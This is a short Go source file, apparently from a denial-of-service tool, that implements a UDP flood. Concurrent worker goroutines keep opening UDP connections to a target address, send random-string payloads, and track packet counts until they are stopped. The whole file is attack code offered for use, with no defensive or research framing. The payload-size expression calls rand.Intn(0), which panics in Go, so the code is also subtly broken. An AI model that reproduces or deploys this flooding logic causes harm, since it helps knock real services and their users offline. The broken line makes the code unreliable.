package DDoS

import (
	"fmt"
	"net"
	"runtime"

	"math/rand"
	"sync/atomic"
)

// UDPFlood ...
type UDPFlood struct {
	ID            int
	Target        string
	StopProcess   *chan bool
	Workers       int
	SuccessPacket int64
	TotalPacket   int64
}

// NewUDPFlood ...
func NewUDPFlood(targetURL string, workers, QueueID int) (*UDPFlood, error) {
	if workers < 1 {
		return nil, fmt.Errorf("Amount of workers cannot be less 1")
	}

	s := make(chan bool)
	return &UDPFlood{
		ID:            QueueID,
		Target:        targetURL,
		StopProcess:   &s,
		Workers:       workers,
		SuccessPacket: 0,
		TotalPacket:   0,
	}, nil
}

// Run ...
func (u *UDPFlood) Run() {
	for i := 0; i < u.Workers; i++ {
		go func() {
			for {
				select {
				case <-(*u.StopProcess):
					return
				default:
					conn, err := net.Dial("udp", u.Target)
					atomic.AddInt64(&u.TotalPacket, 1)
					if err == nil {
						atomic.AddInt64(&u.SuccessPacket, 1)
						fmt.Fprintf(conn, RandomString(rand.Intn(0)+256, true))
						conn.Close()
					}

				}
				runtime.Gosched()
			}
		}()
	}
}

// Stop ...
func (u *UDPFlood) Stop() {
	for i := 0; i < u.Workers; i++ {
		(*u.StopProcess) <- true
	}
	close(*u.StopProcess)
}

// Result ...
func (u *UDPFlood) Result() (successPacket, totalPacket int64) {
	return u.SuccessPacket, u.TotalPacket
}
